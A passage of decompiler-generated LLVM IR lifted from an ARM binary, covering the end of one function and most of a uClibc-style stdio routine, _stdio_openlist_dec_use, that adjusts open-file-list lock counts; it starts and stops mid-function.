  %v7_17890 = icmp slt i32 %v1_17884, 2
  br i1 %v7_17890, label %dec_label_pc_178ac, label %dec_label_pc_17894

dec_label_pc_17894:                               ; preds = %dec_label_pc_1788c
  %v0_17898 = load i32, i32* %r1.global-to-local, align 4
  %v1_17898 = add i32 %v0_17898, 129
  store i32 %v1_17898, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_178ac

dec_label_pc_178ac:                               ; preds = %dec_label_pc_17838, %dec_label_pc_1781c, %dec_label_pc_17894, %dec_label_pc_1788c
  %v0_178ac = load i32, i32* %r8.global-to-local, align 4
  %v2_178b0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_178b0, i32* %r4.global-to-local, align 4
  store i32 %v6_1779c, i32* @r5, align 4
  store i32 %v9_1779c, i32* @r6, align 4
  store i32 %v12_1779c, i32* @r7, align 4
  store i32 %v15_1779c, i32* @r8, align 4
  store i32 %v24_1779c, i32* @lr, align 4
  ret i32 %v0_178ac

; uselistorder directives
  uselistorder i32 %v0_17880, { 1, 0, 2 }
  uselistorder i32 %v1_17864.pre, { 0, 2, 1 }
  uselistorder i32 %v0_17820, { 1, 0 }
  uselistorder i32 %v0_17824, { 1, 0 }
  uselistorder i32 %v1_177e0.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 12, 5, 6, 7, 8, 10, 9, 0, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 11, 12, 4, 5, 6, 8, 7, 0, 9, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_178ac, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_17884, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1786c, { 1, 0 }
  uselistorder label %dec_label_pc_1781c, { 1, 0 }
  uselistorder label %dec_label_pc_17810, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_17800, { 2, 1, 0 }
  uselistorder label %dec_label_pc_177e8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_178b8 = load i32, i32* @r4, align 4
  store i32 %v3_178b8, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r5.global-to-local, align 4
  %v4_178c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 160) to i32*), align 4
  store i32 %v4_178c8, i32* %r7.global-to-local, align 4
  %v0_178cc = call i32 @__aeabi_read_tp()
  store i32 %v0_178cc, i32* %r0.global-to-local, align 4
  %v1_178d0 = add i32 %v4_178c8, 8
  %v2_178d0 = inttoptr i32 %v1_178d0 to i32*
  %v3_178d0 = load i32, i32* %v2_178d0, align 4
  store i32 %v3_178d0, i32* %r3.global-to-local, align 4
  %v1_178d4 = add i32 %v0_178cc, -1168
  store i32 %v1_178d4, i32* %r6.global-to-local, align 4
  %v3_178d8 = icmp uge i32 %v3_178d0, %v1_178d4
  store i1 %v3_178d8, i1* %cpsr_c.global-to-local, align 1
  %v9_178d8 = icmp eq i32 %v3_178d0, %v1_178d4
  br i1 %v9_178d8, label %dec_label_pc_17924, label %dec_label_pc_178e4

dec_label_pc_178e4:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_178c8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_178f093 = inttoptr i32 %v4_178c8 to i32*
  %v2_178f094 = load i32, i32* %v1_178f093, align 4
  store i32 %v2_178f094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_178f496 = icmp eq i32 %v2_178f094, 0
  br i1 %v9_178f496, label %dec_label_pc_178fc, label %dec_label_pc_17914

dec_label_pc_178fc:                               ; preds = %dec_label_pc_178e4, %dec_label_pc_178fc.dec_label_pc_178f0_crit_edge
  %v0_178fc97 = phi i32 [ %v1_178f4.pre, %dec_label_pc_178fc.dec_label_pc_178f0_crit_edge ], [ 0, %dec_label_pc_178e4 ]
  store i32 %v0_178fc97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1790c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1790c, label %dec_label_pc_17910, label %dec_label_pc_178fc.dec_label_pc_178f0_crit_edge

dec_label_pc_178fc.dec_label_pc_178f0_crit_edge:  ; preds = %dec_label_pc_178fc
  %v0_178f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_178f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_178f0 = inttoptr i32 %v0_178f0.pre to i32*
  %v2_178f0 = load i32, i32* %v1_178f0, align 4
  store i32 %v2_178f0, i32* %r3.global-to-local, align 4
  %v3_178f4 = icmp uge i32 %v2_178f0, %v1_178f4.pre
  store i1 %v3_178f4, i1* %cpsr_c.global-to-local, align 1
  %v9_178f4 = icmp eq i32 %v2_178f0, %v1_178f4.pre
  br i1 %v9_178f4, label %dec_label_pc_178fc, label %dec_label_pc_17914

dec_label_pc_17910:                               ; preds = %dec_label_pc_178fc
  %v0_17910 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17910, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17914

dec_label_pc_17914:                               ; preds = %dec_label_pc_178e4, %dec_label_pc_178fc.dec_label_pc_178f0_crit_edge, %dec_label_pc_17910
  %v0_17914 = phi i32 [ %v0_17910, %dec_label_pc_17910 ], [ %v2_178f094, %dec_label_pc_178e4 ], [ %v2_178f0, %dec_label_pc_178fc.dec_label_pc_178f0_crit_edge ]
  %v1_17914 = phi i32 [ %v0_17910, %dec_label_pc_17910 ], [ 0, %dec_label_pc_178e4 ], [ %v1_178f4.pre, %dec_label_pc_178fc.dec_label_pc_178f0_crit_edge ]
  %v3_17914 = icmp uge i32 %v0_17914, %v1_17914
  store i1 %v3_17914, i1* %cpsr_c.global-to-local, align 1
  %v9_17914 = icmp eq i32 %v0_17914, %v1_17914
  br i1 %v9_17914, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_17914
  %v1_17918 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17918, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_17914, %bb
  %v1_1791c = xor i1 %v9_17914, true
  call void @__pseudo_cond_branch(i1 %v1_1791c, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_17920 = load i32, i32* %r6.global-to-local, align 4
  %v1_17920 = load i32, i32* %r7.global-to-local, align 4
  %v2_17920 = add i32 %v1_17920, 8
  %v3_17920 = inttoptr i32 %v2_17920 to i32*
  store i32 %v0_17920, i32* %v3_17920, align 4
  br label %dec_label_pc_17924

dec_label_pc_17924:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17928 = load i32, i32* %r5.global-to-local, align 4
  %v2_17928 = add i32 %v0_17928, 160
  %v3_17928 = inttoptr i32 %v2_17928 to i32*
  %v4_17928 = load i32, i32* %v3_17928, align 4
  store i32 %v4_17928, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17930 = add i32 %v0_17928, 12
  %v3_17930 = inttoptr i32 %v2_17930 to i32*
  %v4_17930 = load i32, i32* %v3_17930, align 4
  store i32 %v4_17930, i32* %r3.global-to-local, align 4
  %v1_17934 = inttoptr i32 %v4_17930 to i32*
  %v2_17934 = load i32, i32* %v1_17934, align 4
  store i32 %v2_17934, i32* %r1.global-to-local, align 4
  %v1_17938 = add i32 %v4_17928, 4
  %v2_17938 = inttoptr i32 %v1_17938 to i32*
  %v3_17938 = load i32, i32* %v2_17938, align 4
  %v2_1793c = icmp ne i32 %v2_17934, 0
  store i1 %v2_1793c, i1* %cpsr_c.global-to-local, align 1
  %v7_1793c = icmp eq i32 %v2_17934, 1
  %v1_17940 = add i32 %v3_17938, 1
  store i32 %v1_17940, i32* %r3.global-to-local, align 4
  store i32 %v1_17940, i32* %v2_17938, align 4
  br i1 %v7_1793c, label %dec_label_pc_1794c, label %dec_label_pc_17ab0

dec_label_pc_1794c:                               ; preds = %dec_label_pc_17924
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_17950 = load i32, i32* %r5.global-to-local, align 4
  %v2_17950 = add i32 %v0_17950, 80
  %v3_17950 = inttoptr i32 %v2_17950 to i32*
  %v4_17950 = load i32, i32* %v3_17950, align 4
  store i32 %v4_17950, i32* %r3.global-to-local, align 4
  %v1_17954 = inttoptr i32 %v4_17950 to i32*
  %v2_17954 = load i32, i32* %v1_17954, align 4
  store i32 %v2_17954, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_17954, 1
  br i1 %tmp46, label %dec_label_pc_17ab0, label %dec_label_pc_17960

dec_label_pc_17960:                               ; preds = %dec_label_pc_1794c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17964 = add i32 %v0_17950, 152
  %v3_17964 = inttoptr i32 %v2_17964 to i32*
  %v4_17964 = load i32, i32* %v3_17964, align 4
  store i32 %v4_17964, i32* %r7.global-to-local, align 4
  %v1_17968 = add i32 %v4_17964, 8
  %v2_17968 = inttoptr i32 %v1_17968 to i32*
  %v3_17968 = load i32, i32* %v2_17968, align 4
  store i32 %v3_17968, i32* %r3.global-to-local, align 4
  %v1_1796c = load i32, i32* %r6.global-to-local, align 4
  %v3_1796c = icmp uge i32 %v3_17968, %v1_1796c
  store i1 %v3_1796c, i1* %cpsr_c.global-to-local, align 1
  %v9_1796c = icmp eq i32 %v3_17968, %v1_1796c
  br i1 %v9_1796c, label %dec_label_pc_179b0, label %dec_label_pc_17974

dec_label_pc_17974:                               ; preds = %dec_label_pc_17960
  store i32 %v4_17964, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1797c86 = inttoptr i32 %v4_17964 to i32*
  %v2_1797c87 = load i32, i32* %v1_1797c86, align 4
  store i32 %v2_1797c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1798089 = icmp eq i32 %v2_1797c87, 0
  br i1 %v9_1798089, label %dec_label_pc_17988, label %dec_label_pc_179a0

dec_label_pc_17988:                               ; preds = %dec_label_pc_17974, %dec_label_pc_17988.dec_label_pc_1797c_crit_edge
  %v0_1798890 = phi i32 [ %v1_17980.pre, %dec_label_pc_17988.dec_label_pc_1797c_crit_edge ], [ 0, %dec_label_pc_17974 ]
  store i32 %v0_1798890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17998 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17998, label %dec_label_pc_1799c, label %dec_label_pc_17988.dec_label_pc_1797c_crit_edge

dec_label_pc_17988.dec_label_pc_1797c_crit_edge:  ; preds = %dec_label_pc_17988
  %v0_1797c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17980.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1797c = inttoptr i32 %v0_1797c.pre to i32*
  %v2_1797c = load i32, i32* %v1_1797c, align 4
  store i32 %v2_1797c, i32* %r3.global-to-local, align 4
  %v3_17980 = icmp uge i32 %v2_1797c, %v1_17980.pre
  store i1 %v3_17980, i1* %cpsr_c.global-to-local, align 1
  %v9_17980 = icmp eq i32 %v2_1797c, %v1_17980.pre
  br i1 %v9_17980, label %dec_label_pc_17988, label %dec_label_pc_179a0

dec_label_pc_1799c:                               ; preds = %dec_label_pc_17988
  %v0_1799c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1799c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_179a0

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17974, %dec_label_pc_17988.dec_label_pc_1797c_crit_edge, %dec_label_pc_1799c
  %v0_179a0 = phi i32 [ %v0_1799c, %dec_label_pc_1799c ], [ %v2_1797c87, %dec_label_pc_17974 ], [ %v2_1797c, %dec_label_pc_17988.dec_label_pc_1797c_crit_edge ]
  %v1_179a0 = phi i32 [ %v0_1799c, %dec_label_pc_1799c ], [ 0, %dec_label_pc_17974 ], [ %v1_17980.pre, %dec_label_pc_17988.dec_label_pc_1797c_crit_edge ]
  %v3_179a0 = icmp uge i32 %v0_179a0, %v1_179a0
  store i1 %v3_179a0, i1* %cpsr_c.global-to-local, align 1
  %v9_179a0 = icmp eq i32 %v0_179a0, %v1_179a0
  br i1 %v9_179a0, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_179a0
  %v1_179a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_179a4, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_179a0, %bb47
  %v1_179a8 = xor i1 %v9_179a0, true
  call void @__pseudo_cond_branch(i1 %v1_179a8, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_179ac = load i32, i32* %r6.global-to-local, align 4
  %v1_179ac = load i32, i32* %r7.global-to-local, align 4
  %v2_179ac = add i32 %v1_179ac, 8
  %v3_179ac = inttoptr i32 %v2_179ac to i32*
  store i32 %v0_179ac, i32* %v3_179ac, align 4
  %v0_179b8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_179b0

dec_label_pc_179b0:                               ; preds = %dec_label_pc_17960, %bb48
  %v0_179b8 = phi i32 [ %v0_17950, %dec_label_pc_17960 ], [ %v0_179b8.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_179b8 = add i32 %v0_179b8, 152
  %v3_179b8 = inttoptr i32 %v2_179b8 to i32*
  %v4_179b8 = load i32, i32* %v3_179b8, align 4
  store i32 %v4_179b8, i32* %r0.global-to-local, align 4
  %v2_179bc = add i32 %v0_179b8, 76
  %v3_179bc = inttoptr i32 %v2_179bc to i32*
  %v4_179bc = load i32, i32* %v3_179bc, align 4
  store i32 %v4_179bc, i32* %r2.global-to-local, align 4
  %v1_179c0 = add i32 %v4_179b8, 4
  %v2_179c0 = inttoptr i32 %v1_179c0 to i32*
  %v3_179c0 = load i32, i32* %v2_179c0, align 4
  store i32 %v3_179c0, i32* %r3.global-to-local, align 4
  %v1_179c4 = inttoptr i32 %v4_179bc to i32*
  %v2_179c4 = load i32, i32* %v1_179c4, align 4
  store i32 %v2_179c4, i32* %r2.global-to-local, align 4
  %v1_179c8 = add i32 %v3_179c0, 1
  store i32 %v1_179c8, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_179c8, i32* %v2_179c0, align 4
  %v0_17a18.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17a1811 = icmp eq i32 %v0_17a18.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_17a1811, label %dec_label_pc_17a24, label %dec_label_pc_179dc

dec_label_pc_179dc:                               ; preds = %dec_label_pc_179b0, %dec_label_pc_17a14
  %v0_17a002 = phi i32 [ %v0_17a14, %dec_label_pc_17a14 ], [ %v0_17a18.pr, %dec_label_pc_179b0 ]
  %v1_179dc = inttoptr i32 %v0_17a002 to i16*
  %v2_179dc = load i16, i16* %v1_179dc, align 2
  %v3_179dc = zext i16 %v2_179dc to i32
  store i32 %v3_179dc, i32* %r3.global-to-local, align 4
  %v2_179e0 = and i32 %v3_179dc, 32816
  store i32 %v2_179e0, i32* %r1.global-to-local, align 4
  %v2_179e4 = icmp ugt i32 %v2_179e0, 47
  store i1 %v2_179e4, i1* %cpsr_c.global-to-local, align 1
  %v7_179e4 = icmp eq i32 %v2_179e0, 48
  %v1_179e8 = add i32 %v0_17a002, 32
  %v2_179e8 = inttoptr i32 %v1_179e8 to i32*
  %v3_179e8 = load i32, i32* %v2_179e8, align 4
  store i32 %v3_179e8, i32* %r4.global-to-local, align 4
  br i1 %v7_179e4, label %dec_label_pc_179f4, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_179dc
  store i32 %v0_17a002, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17a14

dec_label_pc_179f4:                               ; preds = %dec_label_pc_179dc
  %v0_179f4 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_179f4 = icmp eq i32 %v0_179f4, 0
  br i1 %v2_179f4, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_179f4
  %v1_179f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_179f8 = load i32, i32* %r7.global-to-local, align 4
  %v3_179f8 = add i32 %v2_179f8, %v1_179f8
  %v4_179f8 = inttoptr i32 %v3_179f8 to i32*
  %v5_179f8 = load i32, i32* %v4_179f8, align 4
  store i32 %v5_179f8, i32* %r3.global-to-local, align 4
  %v3_179fc = inttoptr i32 %v5_179f8 to i32*
  store i32 %v3_179e8, i32* %v3_179fc, align 4
  %v0_17a00 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a00 = inttoptr i32 %v0_17a00 to i16*
  %v2_17a00 = load i16, i16* %v1_17a00, align 2
  %v3_17a00 = zext i16 %v2_17a00 to i32
  store i32 %v3_17a00, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_179f4
  %v2_17a008 = load i16, i16* %v1_179dc, align 2
  %v3_17a009 = zext i16 %v2_17a008 to i32
  store i32 %v3_17a009, i32* %r3.global-to-local, align 4
  %v3_17a04 = add i32 %v0_179f4, 32
  %v4_17a04 = inttoptr i32 %v3_17a04 to i32*
  store i32 %v3_179e8, i32* %v4_17a04, align 4
  %v0_17a08.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_17a08 = phi i32 [ %v3_17a00, %.thread ], [ %v0_17a08.pre, %bb49 ]
  %v1_17a08 = and i32 %v0_17a08, 8192
  %v2_17a08 = icmp eq i32 %v1_17a08, 0
  br i1 %v2_17a08, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_17a0c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_17a0c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_17a10 = xor i1 %v2_17a08, true
  call void @__pseudo_cond_branch(i1 %v1_17a10, i32 ptrtoint (i32* @global_var_14304.33 to i32))
  %v0_17a14.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17a14

dec_label_pc_17a14:                               ; preds = %.thread38, %bb52
  %v0_17a14 = phi i32 [ %v0_17a14.pre, %bb52 ], [ %v3_179e8, %.thread38 ]
  store i32 %v0_17a14, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17a18 = icmp eq i32 %v0_17a14, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_17a18, label %dec_label_pc_17a24, label %dec_label_pc_179dc

dec_label_pc_17a24:                               ; preds = %dec_label_pc_17a14, %dec_label_pc_179b0
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17a28 = load i32, i32* %r5.global-to-local, align 4
  %v2_17a28 = add i32 %v0_17a28, 152
  %v3_17a28 = inttoptr i32 %v2_17a28 to i32*
  %v4_17a28 = load i32, i32* %v3_17a28, align 4
  store i32 %v4_17a28, i32* %r0.global-to-local, align 4
  %v1_17a2c = add i32 %v4_17a28, 4
  %v2_17a2c = inttoptr i32 %v1_17a2c to i32*
  %v3_17a2c = load i32, i32* %v2_17a2c, align 4
  %v1_17a30 = add i32 %v3_17a2c, -1
  store i32 %v1_17a30, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17a34 = icmp eq i32 %v1_17a30, 0
  store i32 %v1_17a30, i32* %v2_17a2c, align 4
  br i1 %v2_17a34, label %dec_label_pc_17a40, label %dec_label_pc_17aa0

dec_label_pc_17a40:                               ; preds = %dec_label_pc_17a24
  %v0_17a40 = load i32, i32* %r3.global-to-local, align 4
  %v1_17a40 = load i32, i32* %r0.global-to-local, align 4
  %v2_17a40 = add i32 %v1_17a40, 8
  %v3_17a40 = inttoptr i32 %v2_17a40 to i32*
  store i32 %v0_17a40, i32* %v3_17a40, align 4
  %v0_17a44 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17a44, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a48

dec_label_pc_17a48:                               ; preds = %dec_label_pc_17a78.dec_label_pc_17a48_crit_edge, %dec_label_pc_17a40
  %v0_17a48 = phi i32 [ %v0_17a48.pre, %dec_label_pc_17a78.dec_label_pc_17a48_crit_edge ], [ %v0_17a44, %dec_label_pc_17a40 ]
  %v1_17a48 = inttoptr i32 %v0_17a48 to i32*
  %v2_17a48 = load i32, i32* %v1_17a48, align 4
  store i32 %v2_17a48, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17a48, i32* %r2.global-to-local, align 4
  %v2_17a5474 = load i32, i32* %v1_17a48, align 4
  store i32 %v2_17a5474, i32* %r3.global-to-local, align 4
  %v3_17a5876 = icmp uge i32 %v2_17a5474, %v2_17a48
  store i1 %v3_17a5876, i1* %cpsr_c.global-to-local, align 1
  %v9_17a5882 = icmp eq i32 %v2_17a5474, %v2_17a48
  br i1 %v9_17a5882, label %dec_label_pc_17a60, label %dec_label_pc_17a78

dec_label_pc_17a60:                               ; preds = %dec_label_pc_17a48, %dec_label_pc_17a60.dec_label_pc_17a54_crit_edge
  %v0_17a6083 = phi i32 [ %v1_17a58.pre, %dec_label_pc_17a60.dec_label_pc_17a54_crit_edge ], [ %v2_17a48, %dec_label_pc_17a48 ]
  store i32 %v0_17a6083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17a70 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17a70, label %dec_label_pc_17a74, label %dec_label_pc_17a60.dec_label_pc_17a54_crit_edge

dec_label_pc_17a60.dec_label_pc_17a54_crit_edge:  ; preds = %dec_label_pc_17a60
  %v0_17a54.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17a58.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17a54 = inttoptr i32 %v0_17a54.pre to i32*
  %v2_17a54 = load i32, i32* %v1_17a54, align 4
  store i32 %v2_17a54, i32* %r3.global-to-local, align 4
  %v3_17a58 = icmp uge i32 %v2_17a54, %v1_17a58.pre
  store i1 %v3_17a58, i1* %cpsr_c.global-to-local, align 1
  %v9_17a58 = icmp eq i32 %v2_17a54, %v1_17a58.pre
  br i1 %v9_17a58, label %dec_label_pc_17a60, label %dec_label_pc_17a78

dec_label_pc_17a74:                               ; preds = %dec_label_pc_17a60
  %v0_17a74 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17a74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a78

dec_label_pc_17a78:                               ; preds = %dec_label_pc_17a48, %dec_label_pc_17a60.dec_label_pc_17a54_crit_edge, %dec_label_pc_17a74
  %v0_17a80 = phi i32 [ %v0_17a74, %dec_label_pc_17a74 ], [ %v2_17a5474, %dec_label_pc_17a48 ], [ %v2_17a54, %dec_label_pc_17a60.dec_label_pc_17a54_crit_edge ]
  %v1_17a78 = phi i32 [ %v0_17a74, %dec_label_pc_17a74 ], [ %v2_17a48, %dec_label_pc_17a48 ], [ %v1_17a58.pre, %dec_label_pc_17a60.dec_label_pc_17a54_crit_edge ]
  %v3_17a78 = icmp uge i32 %v0_17a80, %v1_17a78
  store i1 %v3_17a78, i1* %cpsr_c.global-to-local, align 1
  %v9_17a78 = icmp eq i32 %v0_17a80, %v1_17a78
  br i1 %v9_17a78, label %dec_label_pc_17a80, label %dec_label_pc_17a78.dec_label_pc_17a48_crit_edge

dec_label_pc_17a78.dec_label_pc_17a48_crit_edge:  ; preds = %dec_label_pc_17a78
  %v0_17a48.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17a48

dec_label_pc_17a80:                               ; preds = %dec_label_pc_17a78
  %v2_17a80 = icmp ne i32 %v1_17a78, 0
  store i1 %v2_17a80, i1* %cpsr_c.global-to-local, align 1
  %v7_17a84 = icmp slt i32 %v1_17a78, 2
  br i1 %v7_17a84, label %dec_label_pc_17aa0, label %dec_label_pc_17a88

dec_label_pc_17a88:                               ; preds = %dec_label_pc_17a80
  %v0_17a88 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17a88, i32* %r0.global-to-local, align 4
  %v0_17a8c = load i32, i32* %r1.global-to-local, align 4
  %v1_17a8c = add i32 %v0_17a8c, 129
  store i32 %v1_17a8c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17aa0

dec_label_pc_17aa0:                               ; preds = %dec_label_pc_17a24, %dec_label_pc_17a88, %dec_label_pc_17a80
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_17aa4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17aa4 = add i32 %v0_17aa4, 80
  %v3_17aa4 = inttoptr i32 %v2_17aa4 to i32*
  %v4_17aa4 = load i32, i32* %v3_17aa4, align 4
  store i32 %v4_17aa4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_17aac = inttoptr i32 %v4_17aa4 to i32*
  store i32 0, i32* %v2_17aac, align 4
  br label %dec_label_pc_17ab0

dec_label_pc_17ab0:                               ; preds = %dec_label_pc_17924, %dec_label_pc_1794c, %dec_label_pc_17aa0
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17ab4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ab4 = add i32 %v0_17ab4, 160
  %v3_17ab4 = inttoptr i32 %v2_17ab4 to i32*
  %v4_17ab4 = load i32, i32* %v3_17ab4, align 4
  store i32 %v4_17ab4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_17abc = add i32 %v0_17ab4, 12
  %v3_17abc = inttoptr i32 %v2_17abc to i32*
  %v4_17abc = load i32, i32* %v3_17abc, align 4
  store i32 %v4_17abc, i32* %r1.global-to-local, align 4
  %v1_17ac0 = add i32 %v4_17ab4, 4
  %v2_17ac0 = inttoptr i32 %v1_17ac0 to i32*
  %v3_17ac0 = load i32, i32* %v2_17ac0, align 4
  store i32 %v3_17ac0, i32* %r2.global-to-local, align 4
  %v1_17ac4 = inttoptr i32 %v4_17abc to i32*
  %v2_17ac4 = load i32, i32* %v1_17ac4, align 4
  %v1_17ac8 = add i32 %v3_17ac0, -1
  store i32 %v1_17ac8, i32* %r2.global-to-local, align 4
  %v1_17acc = add i32 %v2_17ac4, -1
  store i32 %v1_17acc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17ad0 = icmp eq i32 %v1_17ac8, 0
  store i32 %v1_17acc, i32* %v1_17ac4, align 4
  %v0_17ad8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ad8 = load i32, i32* %r0.global-to-local, align 4
  %v2_17ad8 = add i32 %v1_17ad8, 4
  %v3_17ad8 = inttoptr i32 %v2_17ad8 to i32*
  store i32 %v0_17ad8, i32* %v3_17ad8, align 4
  br i1 %v2_17ad0, label %dec_label_pc_17ae0, label %dec_label_pc_17b40

dec_label_pc_17ae0:                               ; preds = %dec_label_pc_17ab0
  %v0_17ae0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ae0 = load i32, i32* %r0.global-to-local, align 4
  %v2_17ae0 = add i32 %v1_17ae0, 8
  %v3_17ae0 = inttoptr i32 %v2_17ae0 to i32*
  store i32 %v0_17ae0, i32* %v3_17ae0, align 4
  %v0_17ae4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17ae4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17ae8

dec_label_pc_17ae8:                               ; preds = %dec_label_pc_17b18.dec_label_pc_17ae8_crit_edge, %dec_label_pc_17ae0
  %v0_17ae8 = phi i32 [ %v0_17ae8.pre, %dec_label_pc_17b18.dec_label_pc_17ae8_crit_edge ], [ %v0_17ae4, %dec_label_pc_17ae0 ]
  %v1_17ae8 = inttoptr i32 %v0_17ae8 to i32*
  %v2_17ae8 = load i32, i32* %v1_17ae8, align 4
  store i32 %v2_17ae8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17ae8, i32* %r2.global-to-local, align 4
  %v2_17af462 = load i32, i32* %v1_17ae8, align 4
  store i32 %v2_17af462, i32* %r3.global-to-local, align 4
